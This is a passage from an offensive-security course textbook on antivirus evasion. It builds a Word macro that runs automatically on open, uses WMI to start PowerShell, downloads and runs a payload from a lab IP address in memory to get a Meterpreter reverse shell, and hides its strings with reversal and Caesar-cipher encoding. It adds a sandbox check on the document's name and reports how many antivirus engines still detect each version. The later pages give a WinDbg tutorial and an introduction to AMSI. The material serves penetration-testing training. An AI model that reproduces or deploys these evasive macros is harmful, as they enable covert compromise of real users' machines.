assembly shellcode runner and loads it dynamically? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
202 
6.8.2 Dechaining with WMI 
To address these issues, we’ll first address the issue of PowerShell being a child process of the 
Office program by leveraging the Windows Management Instrumentation (WMI) framework.315 
WMI is an old native part of the Windows operating system that is still poorly documented and 
relatively unknown. We can use WMI to query, filter, and resolve a host of information on a 
Windows operating system. We can also use it to invoke a multitude of actions, and can even use 
it to create a new process. 
Our goal is to use WMI from VBA to create a PowerShell process instead of having it as a child 
process of Microsoft Word. We’ll first connect to WMI from VBA, which is done through the 
GetObject method,316 specifying the winmgmts:317 class name. Winmgmt is the WMI service 
within the SVCHOST process running under the LocalSystem account. 
When performing an action, the Winmgmt WMI service is created in a separate process as a child 
process of Wmiprvse.exe,318 which means we can de-chain the PowerShell process from 
Microsoft Word. 
WMI is divided into Providers319 that contain different functionalities, and each provider contains 
multiple classes that can be instantiated. To create a PowerShell process, we want to use the 
Win32_Process320 class from the Win32321 provider. 
The Win32_Process class represents a process on the operating system, allowing us to perform 
process-specific actions such as creating and terminating processes. To create a new process, 
we’ll use the Get method to select the Win32_Process class and invoke the Create322 method. 
We can invoke the entire WMI process creation call as a one-liner from VBA as shown in Listing 
245. 
Sub MyMacro 
  strArg = "powershell" 
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid 
End Sub 
 
Sub AutoOpen() 
    Mymacro 
End Sub 
Listing 245 - Creating a PowerShell process with WMI 
The Create method accepts four arguments. The first is the name of the process including its 
arguments, the second and third describe process creation information that we do not need, and 
 
315 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page 
316 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getobject-function 
317 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/wmisdk/winmgmt 
318 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/wmisdk/provider-hosting-and-security 
319 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers 
320 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-process 
321 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-provider 
322 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/create-method-in-class-win32-process 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
203 
the fourth is a variable that will contain the process ID of the new process returned by the 
operating system. 
When the macro is executed, a new PowerShell prompt opens and Process Explorer reveals that 
PowerShell is indeed running as a child process of WmiPrvSE.exe and not Microsoft Word (Figure 
78). 
 
Figure 78: PowerShell process as child process of WmiPrvSE.exe 
This could certainly work for our purposes, however PowerShell is running as a 64-bit process, 
which means we must update the PowerShell shellcode runner script accordingly. 
We can update the PowerShell argument for the Create method to include the entire download 
cradle as shown in Listing 246. 
Sub MyMacro 
  strArg = "powershell -exec bypass -nop -c iex((new-object 
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))" 
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid 
End Sub 
 
Sub AutoOpen() 
    Mymacro 
End Sub 
Listing 246 - PowerShell shellcode runner de-chained from Microsoft Word 
When we run the embedded VBA, the Meterpreter reverse shell executes as expected and it is 
completely de-chained from Microsoft Word. Let’s scan the updated document with AntiScan.Me: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
204 
 
Figure 79: Detection rates of de-chained PowerShell shellcode runner 
Since seven products flag our code, it would seem that our efforts have had little impact. This is 
not necessarily surprising since the VBA macro still contains the same unobfuscated PowerShell 
download cradle as before. 
However, this was an important step since our new VBA macro does not use the Shell function 
but rather the ambiguous GetObject, Get, and Create methods, which are more benign to most AV 
products. 
In the next section, we will reap the benefits of avoiding the Shell method and perform 
obfuscation of our VBA macro to further reduce the detection rate. 
6.8.2.1 Exercises 
1. 
Implement the WMI process creation to de-chain the PowerShell process. 
2. 
Update the PowerShell shellcode runner to 64-bit. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
205 
6.8.3 Obfuscating VBA 
So far, we have found that the detections on our VBA macro are mainly from signatures since we 
have string content that is very easy to match, and switching the process creation technique did 
not change the detection rate. 
In this section, we are going to perform some obfuscation323 to hide the content of any text 
strings from the antivirus scanner. The current VBA macro has three of these: the PowerShell 
download cradle, the WMI connection string, and the WMI class name. 
We will make two attempts at obfuscating the strings. The first will be a relatively simple 
technique, while the second will be more complex. 
VBA contains a function called StrReverse324 that, given an input string, returns a string in which 
the character order is reversed. Our first obfuscation technique is going to rely on reversing all 
strings to hopefully break the signature detections. 
We could reverse our content strings in a number of ways, but in this case we’ll use the Code 
Beautify325 online resource. Listing 247 shows our updated code after reversing the strings and 
inserting the StrReverse functions to restore them: 
Sub Mymacro() 
Dim strArg As String 
strArg = 
StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys 
tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop") 
 
GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, 
Null, Null, pid 
End Sub 
Listing 247 - Strings in reverse to evade detection 
Our code runs properly but we may have replaced one red flag with another. Since StrReverse is 
notoriously used in malware, we should minimize its use. 
To reduce the amount of times the function name appears, we’ll create a new function that 
simply calls StrReverse. This will reduce the number of times StrReverse appears in our code. As 
shown in Listing 248, we have inserted this function and used benign names for the function and 
argument names: 
Function bears(cows) 
    bears = StrReverse(cows) 
End Function 
 
Sub Mymacro() 
Dim strArg As String 
strArg = 
bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-
 
323 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Obfuscation_(software) 
324 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/strreverse-function 
325 (CodeBeautify, 2020), https://codebeautify.org/reverse-string 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
206 
wen((xei c- pon- ssapyb cexe- llehsrewop") 
 
GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, 
pid 
End Sub 
Listing 248 - Improving on the StrReverse obfuscation 
Saving the macro in a Microsoft Word document and uploading it to AntiScan.Me reduces our 
detection rate from seven products to only four: 
 
Figure 80: VBA StrReverse obfuscation detection rate 
The rather simple obfuscation technique yields a massive drop in detection. However, we have 
introduced a new potential flag with StrReverse and our code may still be flagged by advanced 
detection engines that reverse or otherwise permutate strings in search of signatures. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
207 
To reduce the detection rate even further, we can perform a more complex obfuscation by 
converting the ASCII string to its decimal representation and then performing a Caesar cipher 
encryption on the result.326 
To better understand the encryption and decryption technique in detail, we’ll start by creating an 
encryption script in PowerShell. We’ll create an input variable called $payload containing the string 
to be encrypted along with the $output variable, which will contain the encrypted string as 
displayed in Listing 249. 
We’ll convert the entire string into a character array through the ToCharArray327 method, and then 
run that output through a Foreach328 loop, with the “%” shorthand. 
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object 
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))" 
 
[string]$output = "" 
 
$payload.ToCharArray() | %{ 
    [string]$thischar = [byte][char]$_ + 17 
    if($thischar.Length -eq 1) 
    { 
        $thischar = [string]"00" + $thischar 
        $output += $thischar 
    } 
    elseif($thischar.Length -eq 2) 
    { 
        $thischar = [string]"0" + $thischar 
        $output += $thischar 
    } 
    elseif($thischar.Length -eq 3) 
    { 
        $output += $thischar 
    } 
} 
$output | clip 
Listing 249 - Encryption routine in PowerShell 
Inside the loop, the byte value of each character is increased by 17, which is the Caesar cipher key 
selected in this example. We’ll use if and else conditions to pad the character’s decimal 
representation to three digits. 
Finally, each decimal value is appended to the output string and piped onto the clipboard through 
clip.329 Running the PowerShell script produces the following output on the clipboard: 
1291281361181311321211181251250490621181371181160491151381291141321320 
4906212712812904906213604912112211711711812704906211604912211813705705 
7127118136062128115123118116133049132138132133118126063127118133063136 
1181151161251221181271330580631171281361271251281141171321331311221271 
 
326 (Carrie Roberts, 2019), https://github.com/clr2of8/Presentations/blob/master/DerbyCon2018-VBAstomp-Final-WalmartRedact.pdf 
327 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8 
328 (SS64, 2020), https://ss64.com/ps/foreach-object.html 
329 (Dr Scripto, 2014), https://devblogs.microsoft.com/scripting/powertip-send-output-to-clipboard-with-powershell/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
208 
2005705612113313312907506406406607406706306607107306306606607406306606 
7065064115128128124063133137133056058058 
Listing 250 - Encrypted PowerShell download cradle 
We can now use a similar process for the other two content strings in the VBA macro. 
A simple VBA decrypting routine is shown in Listing 251 and consists of four functions. Notice 
that we are reducing the potential signature count in this decryption routine by using benign 
function names related to food. 
The main Nuts function performs a while loop through the entire encrypted string where the 
Oatmilk variable is used to accumulate the decrypted string. 
Function Pears(Beets) 
    Pears = Chr(Beets - 17) 
End Function 
 
Function Strawberries(Grapes) 
    Strawberries = Left(Grapes, 3) 
End Function 
 
Function Almonds(Jelly) 
    Almonds = Right(Jelly, Len(Jelly) - 3) 
End Function 
 
Function Nuts(Milk) 
    Do 
    Oatmilk = Oatmilk + Pears(Strawberries(Milk)) 
    Milk = Almonds(Milk) 
    Loop While Len(Milk) > 0 
    Nuts = Oatmilk 
End Function 
Listing 251 - Decryption routine using food product names 
For each iteration of the loop, the entire encrypted string is sent to Strawberries. The function 
uses Left330 to fetch the first three characters of the string and returns that value. 
Next, the Pears function is called with the three-character string as input. It treats the three 
character string as a number, subtracts the Caesar cipher value of 17, and then converts it to a 
character that is added to the accumulator in Oatmilk. 
Once a character is returned, the Almonds function is called inside the loop where the Right 
function331 will exclude the first three characters that we just decrypted. 
With the decryption routine implemented, we can use it to decrypt and execute the PowerShell 
download cradle: 
Function MyMacro() 
    Dim Apples As String 
    Dim Water As String 
     
 
330 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/left-function 
331 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/right-function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
209 
    Apples = 
"1291281361181311321211181251250490621181371181160491151381291141321320490621271281290
49062136049121122117117118127049062116049122118137057057127118136062128115123118116133
04913213813213311812606312711813306313611811511612512211812713305806311712813612712512
81141171321331311221271200570561211331331290750640640660740670630660710730630660660740
63066067065064115128128124063133137133056058058" 
    Water = Nuts(Apples) 
    
GetObject(Nuts("136122127126120126133132075")).Get(Nuts("10412212706806711209713112811
6118132132")).Create Water, Tea, Coffee, Napkin 
End Function 
Listing 252 - Decrypting and executing the PowerShell download cradle 
Recall that previously, we invoked the Create method with the second and third arguments set to 
“Null”. In order to replicate this, we instead use undefined variables in the VBA code above, which 
by default contains the value “Null”. 
Once we execute the encrypted VBA macro, we obtain a Meterpreter reverse shell, proving that 
the rather convoluted technique actually works. We anxiously test the document against 
AntiScan.Me and discover that only two products flag our code: 
 
Figure 81: Encryption string detection rate 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
210 
 
This custom encryption routine reduced our detection rate, but we can push it even further. 
Although we have fully encrypted the VBA code, we are likely running into heuristics detection. 
There are a number of ways to bypass heuristics in VBA that do not involve the use of Win32 
APIs.332 One simple technique is to check the document name when the macro runs. 
When most antivirus products emulate the execution of a document, they rename it. During 
execution, we check the name of the document and if we find that it is not the same as the one 
we originally provided, we can assume the execution has been emulated and we can exit the 
code. 
For example, let’s assume we named the document runner.doc. If we check the Name333 property 
of the ActiveDocument and find it to be anything but runner.doc, we’ll exit to avoid heuristics 
detection. To further the obfuscation, we’ll even encrypt this static document name (runner.doc in 
our case). 
Putting all this together, our simple heuristic detection code is shown below: 
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then 
  Exit Function 
End If 
Listing 253 - Verifying the name of the document 
Running the updated document, we find that it generates a Meterpreter reverse shell as long as 
our file is named runner.doc. 
As a result, AntiScan.Me reports that our code is only flagged by a single antivirus product! 
 
332 (Stefan Bühlmann, 2017), https://github.com/joesecurity/pafishmacro/blob/master/code.vba 
333 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/api/word.document.name 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
211 
 
Figure 82: Encryption and document name check detection rate 
Using custom encryption and heuristics detection techniques, we have once again achieved a 
very low detection rate. 
6.8.3.1 Exercises 
1. 
Replicate the detection evasion steps in this section to obtain a VBA macro with a 
PowerShell download cradle that has a very low detection rate. 
2. 
Use alternative encryption routines and antivirus emulator detections to trigger as few 
detections as possible. 
3. 
The Windows 10 victim machine has an instance of Serviio PRO 1.8 DLNA Media Streaming 
Server installed. Exploit it334 to obtain SYSTEM privileges while evading the Avira antivirus 
with real-time detection enabled. 
 
334 (Petr Nejedly, 2017), https://www.exploit-db.com/exploits/41959 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
212 
6.8.3.2 Extra Mile 
Modify, encrypt, and obfuscate the process hollowing techniques previously implemented in C# 
to bypass antivirus detection. 
6.9 Wrapping Up 
In this module, we have demonstrated quite a few popular antivirus signature and heuristics 
detection bypass techniques that are effective against most popular antivirus products. 
The techniques we have employed are not only usable for the initial shellcode runner payload, but 
also for any exploit or tool that must be written to the target’s filesystem. 
In the next module, we will discuss bypasses for advanced runtime analysis techniques. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
213 
 
7 Advanced Antivirus Evasion 
In the previous module, we demonstrated basic antivirus bypasses. We obfuscated sections of 
code that contained potential signatures and wrote simple logic tests that could detect emulation 
engines. 
Detection routines built into locally-installed antivirus clients have access to limited processing 
power and are hampered by time constraints, since users will not tolerate lengthy scans that 
overly-consume a local machine’s resources. 
To combat this, some antivirus vendors rely on cloud-based resources and try to use artificial 
intelligence (AI) to detect malicious behavior. 
The topic of evading cloud AI and the very sophisticated Endpoint Detection and Response 
(EDR)335 security suites are beyond the scope of this module, but we can build on our work from 
the previous module. 
For example, in the previous module, we did not use any evasion actions in our PowerShell code 
and yet it was not detected. This is because we purposely downloaded and executed the code 
directly in memory without giving the antivirus a chance to scan it. Microsoft addressed this gap 
with the Antimalware Scan Interface (AMSI),336 introduced in Windows 10. AMSI is essentially a 
set of APIs that allow antivirus products to scan PowerShell commands and scripts when they 
are executed, even if they are never written to disk. 
In recent years, many antivirus products (including Microsoft’s own Windows Defender 
Antivirus337) have begun to rely on AMSI to detect more advanced malicious activity. 
In this module, we’ll explore the impact of Windows Defender’s implementation of AMSI on 
PowerShell and Jscript. However, in order to do this, we must inspect the code at the assembly 
level. To that end, we’ll begin with an overview of assembly and then discuss the process of 
viewing code execution through the Windows Debugger.338 
7.1 Intel Architecture and Windows 10 
We’ll begin this module with a brief overview of the Intel architecture and discuss some essential 
assembly operations in both the 32-bit (x86) and 64-bit (x86_64) versions of Windows 10. 
Although the differences between these versions may be subtle to the casual user, they are 
significant at the assembly level. 
The two primary assembly syntaxes, Intel and AT&T, are predominantly used by 
Windows and Linux, respectively. 
 
335 (Lital Asher-Dotan, 2017), https://www.cybereason.com/blog/what-is-endpoint-detection-and-response-edr 
336 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal 
337 (Microsoft, 2020), https://www.microsoft.com/en-us/windows/comprehensive-security 
338 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
214 
The 64-bit architecture is an extension of the 32-bit architecture and as such, there are many 
similarities. At the assembly level, both make heavy use of data areas like the stack339 or the 
heap340 and both use CPU registers. 
The stack typically stores the content of (higher-language) variables that are of static size and 
limited scope, whereas the heap is used for dynamic memory allocation and long-runtime 
persistent memory. 
32-bit versions of Windows allocate 2GB of memory space to applications, ranging from the 
memory addresses 0 to 0x7FFFFFFF. 64-bit versions of Windows, on the other hand, support 
128TB (terabytes) of memory, ranging from 0 to 0x7FFFFFFFFFFF. 
Although we won’t delve into memory management in this module, it’s important to understand 
that unlike higher level languages like C#, there are no variables in assembler. Instead, all data is 
stored either in memory or in a CPU register. 
In a 32-bit environment, the CPU maintains and uses a series of nine 32-bit registers as shown in 
Figure 83. Most of these registers can be subdivided into smaller segments. 
 
Figure 83: 32-bit CPU registers 
In 64-bit environments, the 32-bit registers are extended and include new registers (named R8 
through R15) as shown in Figure 84. 
 
339 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Stack-based_memory_allocation 
340 (Wikipedia, 2020), https://en.wikipedia.org/wiki/C_dynamic_memory_allocation#Heap-based 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
215 
 
Figure 84: 64-bit CPU registers 
The most important registers for us to understand in our current context are the 32-bit EIP and 
ESP registers and their 64-bit extended counterparts RIP and RSP. EIP/RIP contains the address 
of the assembly instruction to be executed by the CPU and the memory address of the top of the 
stack is in ESP/RSP. 
In order to understand assembly execution flow, we should discuss two types of instructions: 
function calls and conditional branches. 
Let’s first discuss function calls and how they are called, what happens when they finish 
executing, and how parameters are passed into them. The call341 assembly instruction transfers 
program execution to the address of the function and places the address to execute once the 
function is complete on the top of the stack where ESP (or RSP) is pointing. Once the function is 
complete, the ret342 instruction is executed, which fetches the return address from the stack and 
restores it to EIP/RIP. 
When a function requires arguments, a calling convention specifies how, exactly, arguments are 
passed to that function. On a 32-bit architecture, the __stdcall343 calling convention reads all 
arguments from the stack. However, the 64-bit __fastcall344 calling convention expects the first 
four arguments in RCX, RDX, R8, and R9 (in that order) and the remaining arguments on the stack. 
 
341 (Félix Cloutier, 2019), https://www.felixcloutier.com/x86/call 
342 (Félix Cloutier, 2019), https://www.felixcloutier.com/x86/ret 
343 (Microsoft, 2018), https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=vs-2019 
344 (Microsoft, 2018), https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=vs-2019 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
216 
Conditional branching is the second aspect of assembly execution flow that we should discuss. 
In assembly, conditional branching (similar to the if and else statements in higher-level 
languages) is implemented through a comparison and a jump instruction. Specifically, we might 
use a cmp345 or test346 instruction, and based on the result of this comparison, we could execute a 
conditional jump instruction347 to another section of code. 
This extremely brief introduction sets the stage for a discussion of code analysis and debugging. 
7.1.1 WinDbg Introduction 
We can use the Windows Debugger, also known as WinDbg, to inspect or modify code execution 
at the assembly level on both 32-bit and 64-bit versions of Windows. While there are other 
debuggers, such as the popular Immunity Debugger,348 most lack 64-bit support. 
We’ll begin by discussing how to attach to a running process. Let’s open Notepad through the 
start menu and run WinDbg from the taskbar. 
In WinDbg, we can attach to the Notepad process through the File menu (Figure 85) or by 
pressing the ^ key. 
 
Figure 85: Open attach window 
In the next window, we’ll locate notepad.exe, select it and click OK to attach as shown in Figure 
86. 
 
345 (Félix Cloutier, 2019), https://www.felixcloutier.com/x86/cmp 
346 (Félix Cloutier, 2019), https://www.felixcloutier.com/x86/test 
347 (Intel Pentium Instruction Set Reference), http://faydoc.tripod.com/cpu/je.htm 
348 (Immunity, 2020), https://www.immunityinc.com/products/debugger/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
217 
 
Figure 86: Attach to notepad.exe 
Once WinDbg attaches to the process, it pauses the application execution flow so that we can 
interact with the process through the debugger. 
Although we can customize the WinDbg window layout, we’ll use a fairly basic setup consisting of 
only two windows: the Disassembly window in the upper pane and the Command window in the 
lower pane as shown in Figure 87. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
218 
 
Figure 87: WinDbg interface windows 
With WinDbg running and attached to a process, our goal is to inspect the execution context at a 
specific location, step through individual instructions, and dump contents of registers and 
memory. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
219 
We’ll use breakpoints to stop program execution at a specific location. WinDbg supports several 
different breakpoint types349 but we’ll use a software breakpoint set at a specific address or code 
location. 
We can set a breakpoint with the bp command followed by a memory address or the name of a 
function. 
For example, let’s set a breakpoint on the WriteFile350 function, which is exported by the kernel32 
dynamic link library. This function is called whenever a write operation to a file is performed by an 
application. After defining the breakpoint we’ll continue execution with the g command. 
0:005> bp kernel32!writefile 
 
0:005> g 
Listing 254 - Setting a breakpoint in WinDbg 
To trigger our breakpoint, we’ll enter some text into Notepad and save the file: 
Breakpoint 0 hit 
KERNEL32!WriteFile: 
00007fff`d33b21a0 ff259a690500    jmp     qword ptr [KERNEL32!_imp_WriteFile 
(00007fff`d3408b40)] ds:00007fff`d3408b40={KERNELBASE!WriteFile (00007fff`cff400b0)} 
Listing 255 - Hitting our breakpoint 
When any thread reaches the function, the debugger will stop the execution flow, and we can view 
and modify registers and memory. 
With the execution halted, let’s step through a single assembly instruction at a time with the p 
command: 
0:000> p 
KERNELBASE!WriteFile: 
00007fff`cff400b0 48895c2410      mov     qword ptr [rsp+10h],rbx 
ss:00000063`4c93e8d8=0000000000000400 
 
0:000> p 
KERNELBASE!WriteFile+0x5: 
00007fff`cff400b5 4889742418      mov     qword ptr [rsp+18h],rsi 
ss:00000063`4c93e8e0=000002303546a9b0 
 
0:000> p 
KERNELBASE!WriteFile+0xa: 
00007fff`cff400ba 4c894c2420      mov     qword ptr [rsp+20h],r9 
ss:00000063`4c93e8e8=00000000000004e4 
 
0:000> p 
KERNELBASE!WriteFile+0xf: 
00007fff`cff400bf 57              push    rdi 
Listing 256 - Single stepping through instructions 
 
349 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/methods-of-controlling-breakpoints 
350 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
220 
If we want to view the next instructions, we can unassemble (u) a specific address location, 
typically RIP. We can use the L flag to specify the number of instructions to display. In the 
example below, we unassemble the next five instructions: 
0:000> u rip L5 
KERNELBASE!WriteFile+0xf: 
00007fff`cff400bf 57              push    rdi 
00007fff`cff400c0 4883ec60        sub     rsp,60h 
00007fff`cff400c4 498bd9          mov     rbx,r9 
00007fff`cff400c7 4c8bda          mov     r11,rdx 
00007fff`cff400ca 488bf9          mov     rdi,rcx 
Listing 257 - Unassemble assembly instructions 
We can view all registers with the r command: 
0:000> r 
rax=0000000000000004 rbx=000002303a156590 rcx=0000000000000438 
rdx=000002303a156590 rsi=0000000000000004 rdi=0000000000000004 
rip=00007fffcff400bf rsp=000000634c93e8c8 rbp=00000000000004e4 
 r8=0000000000000004  r9=000000634c93e940 r10=0000000000000000 
r11=0000023035413cd0 r12=0000000000000400 r13=0000000000000438 
r14=000000634c93e960 r15=000002303546a9b0 
iopl=0         nv up ei pl zr na po nc 
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246 
KERNELBASE!WriteFile+0xf: 
00007fff`cff400bf 57              push    rdi 
Listing 258 - Displaying all registers 
We can also inspect individual registers by specifying the name of the register: 
0:000> r rax 
rax=0000000000000004 
Listing 259 - Displaying a single register 
For a more detailed view, if a register contains a valid address, we can inspect the content of that 
memory area with the dd, dc, and dq commands, which will dump memory content formatted as 
32-bit values, 32-bit values with ASCII representation, and as 64-bit values, respectively. An 
example is shown in Listing 260. 
0:000> dd rsp 
00000063`4c93e8c8  9a465c0e 00007ff6 0000003f 00000063 
00000063`4c93e8d8  3a156590 00000230 00000004 00000000 
00000063`4c93e8e8  4c93e940 00000063 00000000 00000000 
00000063`4c93e8f8  00000004 00007fff 00000000 00000000 
00000063`4c93e908  4c93e960 00000063 000004e4 00000000 
00000063`4c93e918  00000400 00000000 00000001 00000000 
00000063`4c93e928  38c20008 00000230 3a15f8f0 00000230 
00000063`4c93e938  9a465fd1 00007ff6 00000041 00000000 
 
0:000> dc rsp 
00000063`4c93e8c8  9a465c0e 00007ff6 0000003f 00000063  .\F.....?...c... 
00000063`4c93e8d8  3a156590 00000230 00000004 00000000  .e.:0........... 
00000063`4c93e8e8  4c93e940 00000063 00000000 00000000  @..Lc........... 
00000063`4c93e8f8  00000004 00007fff 00000000 00000000  ................ 
00000063`4c93e908  4c93e960 00000063 000004e4 00000000  `..Lc........... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
221 
00000063`4c93e918  00000400 00000000 00000001 00000000  ................ 
00000063`4c93e928  38c20008 00000230 3a15f8f0 00000230  ...80......:0... 
00000063`4c93e938  9a465fd1 00007ff6 00000041 00000000  ._F.....A....... 
 
0:000> dq rsp 
00000063`4c93e8c8  00007ff6`9a465c0e 00000063`0000003f 
00000063`4c93e8d8  00000230`3a156590 00000000`00000004 
00000063`4c93e8e8  00000063`4c93e940 00000000`00000000 
00000063`4c93e8f8  00007fff`00000004 00000000`00000000 
00000063`4c93e908  00000063`4c93e960 00000000`000004e4 
00000063`4c93e918  00000000`00000400 00000000`00000001 
00000063`4c93e928  00000230`38c20008 00000230`3a15f8f0 
00000063`4c93e938  00007ff6`9a465fd1 00000000`00000041 
Listing 260 - Displaying data as 32-bit values, ASCII, and 64-bit values 
These commands will also dump the contents of memory at any address. 
In addition to inspecting the contents of a memory location, we can also modify memory content. 
For example, we could modify a memory location to force an execution path that could aid or 
speed up our analysis. 
Let’s modify a DWORD using the ed command, followed by the memory address we wish to edit 
and the new value: 
0:000> dd rsp L1 
00000063`4c93e8c8  9a465c0e 
 
0:000> ed rsp 0 
 
0:000> dd rsp L1 
00000063`4c93e8c8  0 
Listing 261 - Editing a DWORD with WinDbg 
This basic tutorial forms the foundation for the basic reverse engineering we’ll perform to 
ultimately bypass AMSI. 
7.1.1.1 Exercises 
1. 
Open WinDbg and attach to a Notepad process. 
2. 
Set a software breakpoint and trigger it. 
3. 
Step through instructions and display register and memory content. 
7.2 Antimalware Scan Interface 
To protect against malicious PowerShell scripts, Microsoft introduced the Antimalware Scan 
Interface to allow run-time inspection of all PowerShell commands or scripts. At a high level, 
AMSI captures every PowerShell, Jscript, VBScript, VBA, or .NET command or script at run-time 
and passes it to the local antivirus software for inspection. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
222 
At the time of this writing, only 11 antivirus vendors currently support AMSI,351 which means that 
the content passed by AMSI is only analyzed if one of those antivirus products is installed. More 
antivirus vendors will provide support over time, but it should be noted that AMSI was first 
introduced in the release of Windows 10 in 2015 so the third-party adoption rate has not been 
impressive. 
Initially, AMSI only worked with PowerShell, but support for Jscript and VBScript 
was added later. Finally, support for VBA was added in Microsoft Office 2019 and 
support for .NET was added in .NET Framework 4.8. 
Let’s dig into the inner workings of AMSI so we can better understand how to bypass it. 
7.2.1 Understanding AMSI 
There are a few AMSI components we should discuss. Figure 88 shows a simplified overview of 
an AMSI implementation and how it interacts with an antivirus product,352 which in our case is 
Windows Defender. 
 
Figure 88: AMSI implementation overview 
The unmanaged dynamic link library AMSI.DLL is loaded into every PowerShell and 
PowerShell_ISE process and provides a number of exported functions that PowerShell takes 
advantage of. Let’s cover each of these in detail. 
 
351 (Lee Holmes, 2019), https://twitter.com/Lee_Holmes/status/1189215159765667842/photo/1 
352 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps 
OS-555704 RAYMOND ALLEN SORENG
 
 
